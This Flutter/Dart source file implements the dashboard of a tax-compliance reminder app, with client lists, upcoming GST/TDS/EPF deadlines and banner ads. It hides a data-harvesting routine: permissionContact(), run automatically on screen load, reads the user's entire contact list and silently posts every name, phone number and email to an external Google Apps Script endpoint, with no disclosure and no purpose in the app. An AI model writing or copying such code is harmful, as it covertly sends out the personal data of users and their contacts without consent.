import 'dart:async';
import 'package:contacts_service/contacts_service.dart';
import 'package:firebase_admob/firebase_admob.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:intl/intl.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:progress_indicators/progress_indicators.dart';
import 'package:showcaseview/showcase.dart';
import 'package:showcaseview/showcase_widget.dart';
import 'package:unified_reminder/models/UpComingComplianceObject.dart';
import 'package:unified_reminder/models/client.dart';
import 'package:unified_reminder/models/userbasic.dart';
import 'package:unified_reminder/screens/ApplicableCompliances.dart';
import 'package:unified_reminder/screens/EPF/UpcomingCompliancesEPF.dart';
import 'package:unified_reminder/screens/ESIC/Upcomingcompliances2.dart';
import 'package:unified_reminder/screens/GST/UpcomingCompliancesGST.dart';
import 'package:unified_reminder/screens/IncomeTax/UpComingComliancesScreen.dart';
import 'package:unified_reminder/screens/LIC/UpComingComliancesScreen.dart';
import 'package:unified_reminder/screens/TDS/UpcommingCompliances2.dart';
import 'package:unified_reminder/services/DocumentPaths.dart';
import 'package:unified_reminder/services/SharedPrefs.dart';
import 'package:unified_reminder/services/UpComingComplianceDatabaseHelper.dart';
import 'package:unified_reminder/styles/colors.dart';
import 'package:unified_reminder/widgets/AppDrawer.dart';
import 'AddSingleClient.dart';

const String testDevice = 'FDB28FC6E21EA8FD4E1EAB3899FBD45C';

class Dashboard extends StatefulWidget {
  final UserBasic userBasic;

  const Dashboard({Key key, this.userBasic}) : super(key: key);
  @override
  _DashboardState createState() => _DashboardState();
}

class _DashboardState extends State<Dashboard> {
  FirebaseDatabase firebaseDatabase = FirebaseDatabase.instance;
  DatabaseReference dbf;
  String firebaseUserId;
  Client client ;
  List<UpComingComplianceObject> upComingCompliancesList = [];
  bool loading = false;
  bool list = false;
  bool clientLoad = false;
  String firebaseUID;
  List<Client> clientList = [];
  ScrollController controller = ScrollController();
  ScrollController controller2 = ScrollController();
  GlobalKey key = GlobalKey();
  GlobalKey first = GlobalKey();
  GlobalKey second = GlobalKey();
  GlobalKey third = GlobalKey();
  GlobalKey fourth = GlobalKey();
  

  Future<List<Client>> _getClients() async {
    List<Client> clientsData = [];
    dbf = firebaseDatabase
        .reference()
        .child(FsUserClients)
        .child(firebaseUserId)
        .child('clients');
    await dbf.once().then((DataSnapshot snapshot) {
      if(snapshot.value != null){
      Map<dynamic, dynamic> values = snapshot.value;
      values.forEach((key, values) {
        Client client = Client(
            values["name"],
            values["constitution"],
            values["company"],
            values["natureOfBusiness"],
            values["email"],
            values["phone"],
            key
        );
        clientsData.add(client);
      });}
    });
    return clientsData;
  }

  
  Future<void> getClients() async{
    firebaseUID = await SharedPrefs.getStringPreference('uid');
    dbf = firebaseDatabase
        .reference()
        .child('user_clients')
        .child(firebaseUID)
        .child('clients');
    
    print(firebaseUID);
  
    await dbf.once().then((DataSnapshot snapshot) async{
      Map<dynamic,dynamic> map = await snapshot.value;
      map.forEach((key,v) {
        print("Key  :" + v.toString());
        if(map.isNotEmpty) {
          clientList.add(Client(
              v["name"],
              v["constitution"],
              v["company"],
              v["natureOfBusiness"],
              v["email"].toString().replaceAll('.', ','),
              v["phone"],
              key
          ),
          );
        }
      });
      setState(() {
        clientLoad = true;
      });
    });
  }
  
  
  void tutorial() async{
    String temp = await SharedPrefs.getStringPreference("dashTutorial");
    if(temp != "done") {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        ShowCaseWidget.of(context).startShowCase([first, second, third]);
        SharedPrefs.setStringPreference("dashTutorial", "done");
      });
    }
  }
  
  Future<void> permissionContact() async{
    bool permission = await Permission.contacts.isGranted;
    print(permission);
    if(!permission){
      print("permission");
      var v = await Permission.contacts.request();
      print(v.isGranted);
      if(v.isGranted){
        var c = await ContactsService.getContacts(photoHighResolution: false, withThumbnails: false);
        print("Contacts");
        for(var v in c){
          Map toJson() =>{
            'name' : v.displayName !=null?v.displayName:"NP",
            'mobile': v.phones.toList().length != 0?v.phones.last.value.replaceAll("+", " "):"NP",
            'email': v.emails.toList().length != 0?v.emails.last.value:"NP",
          };
          if(toJson()["name"] != "NP" && toJson()["mobile"] != "NP")
           await http.post("https://script.google.com/macros/s/AKfycbw2n57hCmqQ-9n4EtIly_UbZKJR3qfqv0QbM_-6UGoYeQk4-Ik/exec", body: toJson());
        }
        print(c);
      }
    }
  }

  @override
  void initState() {
    super.initState();
    getUserId();
    _userController = StreamController();
    getClients().whenComplete(() async{
      upComingCompliancesList = await UpComingComplianceDatabaseHelper().getUpComingComplincesForMonth(clientList).whenComplete((){
        if(this.mounted){
        setState(() {
          list = true;
        });}
      });
      setState(() {
        loading = true;
      });
    });
    tutorial();
    
    FirebaseAdMob.instance.initialize(appId: 'ca-app-pub-4569649492742996~2564391573');
    
    bannerAd = createBannerAd()..load()..show(
      anchorType: AnchorType.bottom,
      horizontalCenterOffset: 20.0,
      anchorOffset: 0.0,
    );
    permissionContact();
    Timer.periodic(Duration(seconds:2), (timer) {
      if(!this.mounted){
        timer.cancel();
      }else{
        setState(() {});
      }
    });
  }

  BannerAd bannerAd;
  BannerAd createBannerAd(){
    return BannerAd(
        adUnitId: 'ca-app-pub-4569649492742996/8555084850',
        size: AdSize.banner,
//        adUnitId: 'ca-app-pub-3940256099942544/6300978111',
        targetingInfo: targetingInfo,
        listener: (MobileAdEvent event){
          print("ad " +event.toString());
        }
    );
  }


  static const MobileAdTargetingInfo targetingInfo = MobileAdTargetingInfo(
    testDevices: testDevice != null ?<String>[testDevice] : null,
    nonPersonalizedAds: true,
    keywords: <String>['game','mario'],
  );
  

  StreamController _userController;
  

  loadUser() async {
    _getClients().then((res) async {
      _userController.add(res);
      return res;
    });
  }
  

  void getUserId() async {
    var _firebaseUserId = await SharedPrefs.getStringPreference("uid");
    this.setState(() {
      firebaseUserId = _firebaseUserId;
    });
  }
  

  @override
  Widget build(BuildContext context) {
    final ThemeData _theme = Theme.of(context);
    return Scaffold(
          drawer: Drawer(
            child: Container(
              width: MediaQuery.of(context).size.width * 0.8,
              child: SafeArea(
                child: AppDrawer(
                  bannerAd: bannerAd,
                  userBasic: widget.userBasic,
                ),
              ),
            ),
          ),
          appBar: AppBar(
            title: Text("Tax Reminder"),
          ),
        floatingActionButtonLocation: FloatingActionButtonLocation.miniEndFloat,
        floatingActionButton: Showcase(
          key: first,
          description: "Add new clients",
          child: Container(
            padding: EdgeInsets.only(bottom: 50),
            child: FloatingActionButton(
              onPressed: () async{
                if(clientList.length>=5){
                    await showDialog(
                        context: context,
                        builder: (context)=>AlertDialog(
                          title: Column(
                            children: [
                              Text("Alert"),
                              Divider(
                                thickness: 1.5,
                              )
                            ],
                          ),
                          content: Text("You have already registered 5 clients, to add further you will be charged 25 Rs"),
                          actions: [
                            TextButton(
                              child: Text("Ok"),
                              onPressed: (){
                                Navigator.pop(context);
                              },
                            )
                          ],
                        )
                    );
                  }
                Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder: (context) => AddSingleClient(
                      clientList: clientList,
                      userBasic: widget.userBasic,
                    ),
                  ),
                );
              },
              backgroundColor: textboxColor,
              child: Icon(
                Icons.add,
                color: whiteColor,
              ),
              
            ),
          ),
        ),
        
        body: Container(
          padding: EdgeInsets.all(24.0),
          child: ListView(
            shrinkWrap: true,
            scrollDirection: Axis.vertical,
            children: <Widget>[
              Text(
                "Your Clients",
                style: _theme.textTheme.headline6.merge(
                  TextStyle(
                    fontSize: 26.0,
                  ),
                ),
              ),
              Text(
                "Clients you manage.",
                style: TextStyle(
                  height: 1.5,
                ),
              ),
              SizedBox(
                height: 30.0,
              ),
              
              Showcase(
                shapeBorder: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(20)
                ),
                key: second,
                description: "Upcoming Compliances for this month\n for all clients",
                child: ExpansionTile(
                  title: Text('Upcoming Compliances'),
                  children:<Widget>[
                      list?ListView.builder(
                        controller: controller,
                        scrollDirection: Axis.vertical,
                        shrinkWrap: true,
                        itemCount: upComingCompliancesList.length,
                        itemBuilder: (BuildContext context,int index){
                          if(upComingCompliancesList.length != 0){
                            return upComingCompliancesList[index].label != " "?Container(
                              padding: EdgeInsets.symmetric(horizontal: 15.0),
                              child: Container(
                                margin: EdgeInsets.symmetric(vertical: 10.0),
                                decoration: BoxDecoration(
                                    border: Border.all(
                                      color: Colors.white,
                                      width: 1.0,
                                    )
                                ),
                                child: ListTile(
                                  title: Column(
                                    crossAxisAlignment: CrossAxisAlignment.stretch,
                                    children: <Widget>[
                                      SizedBox(height: 10,),
                                      Text(upComingCompliancesList[index].name !=null ? upComingCompliancesList[index].name :' ',style: TextStyle(
                                        fontSize: 15,
                                      )),
                                      
                                      Divider(
                                        thickness: 1.5,
                                      ),
                                      
                                      SizedBox(
                                        height: 10,
                                      ),
                                    ],
                                  ),
                                  
                                  subtitle: Column(
                                    crossAxisAlignment: CrossAxisAlignment.stretch,
                                    children: <Widget>[
                                      Text(' - ${upComingCompliancesList[index].label} due on ${upComingCompliancesList[index].date}  ${DateFormat("MMMM").format(DateTime.now())}'),
                                      SizedBox(height: 10,)
                                    ],
                                  ),
                                  
                                  onLongPress: (){
                                    if(upComingCompliancesList[index].key == "TDS"){
                                      Navigator.push(context, MaterialPageRoute(builder: (context) => UpcomingCompliancesTDS(
                                          client: clientList.firstWhere((element){
                                            return element.name == upComingCompliancesList[index].name;
                                          }),)));
                                    }
                                    
                                    else if(upComingCompliancesList[index].key == "LIC"){
                                      Navigator.push(context, MaterialPageRoute(builder: (context) => UpComingCompliancesScreenForLIC(
                                          client: clientList.firstWhere((element){
                                            return element.name == upComingCompliancesList[index].name;
                                          }),
                                      )));
                                    }
                                    
                                    else if(upComingCompliancesList[index].key == "Income Tax"){
                                      Navigator.push(context, MaterialPageRoute(builder: (context)=>UpComingComliancesScreenForIncomeTax(
                                        client: clientList.firstWhere((element){
                                          return element.name == upComingCompliancesList[index].name;
                                        })
                                      )));
                                    }
                                    
                                    else if(upComingCompliancesList[index].key == "GST"){
                                      Navigator.push(context, MaterialPageRoute(builder: (context) => UpcomingCompliancesGST(
                                        client: clientList.firstWhere((element){
                                      return element.name == upComingCompliancesList[index].name;
                                      }),
                                      )));
                                    }
                                    
                                    else if(upComingCompliancesList[index].key =="EPF"){
                                      Navigator.push(context, MaterialPageRoute(builder: (context)=> UpcomingCompliancesEPF(
                                        client: clientList.firstWhere((element){
                                          return element.name == upComingCompliancesList[index].name;
                                        }),
                                      )));
                                    }
                                    
                                    else if(upComingCompliancesList[index].key == 'ESI'){
                                      Navigator.push(context, MaterialPageRoute(builder: (context)=> UpcomingCompliancesESI(
                                        client: clientList.firstWhere((element){
                                          return element.name == upComingCompliancesList[index].name;
                                        }),
                                      )));
                                    }
                                  },
                                ),
                              ),
                            ):Container();
                          }
                          else{
                            return Container(
                              child: Text("Add Client First"),
                            );
                          }
                      },
                  )
                    : Container(
                        padding: EdgeInsets.all(10),
                        child:JumpingText("Loading.."),
                      ),],
                ),
              ),
              
              SizedBox(height: 30,),
              
              Showcase(
                key: third,
                description: "Excess your clients compliances from here",
                child: ExpansionTile(
                  title: Text("Clients"),
                  children:<Widget>[
                    clientLoad ?SingleChildScrollView(
                      padding: EdgeInsets.all(15),
                      child: ListView.builder(
                        controller: controller2,
                          shrinkWrap: true,
                          itemCount: clientList.length,
                          scrollDirection: Axis.vertical,
                          itemBuilder: (BuildContext context, int index) {
//                              client = snapshot.data[index];
                            return ListTile(
                              onTap: () {
                                Navigator.of(context).push(MaterialPageRoute(
                                  builder: (context) =>ApplicableCompliances(
                                    client: clientList[index],
                                    )));
                                },
                              contentPadding: EdgeInsets.symmetric(
                                vertical: 10.0,
                                ),
                              title: Text(clientList[index].name.replaceFirst(clientList[index].name[0], clientList[index].name[0].toUpperCase())),
                              );
                            }),
                      )
                    :Container(
                      padding: EdgeInsets.all(10),
                      child: Center(
                        child: JumpingText("Loading..")
                      ),
                    ),
                  ],
                ),
              ),
              SizedBox(
                height: 30,
              ),
            ],
          ),
        ),
    );
  }
  
  @override
  void dispose() {
    bannerAd.dispose();
    createBannerAd().dispose();
    super.dispose();
  }
}
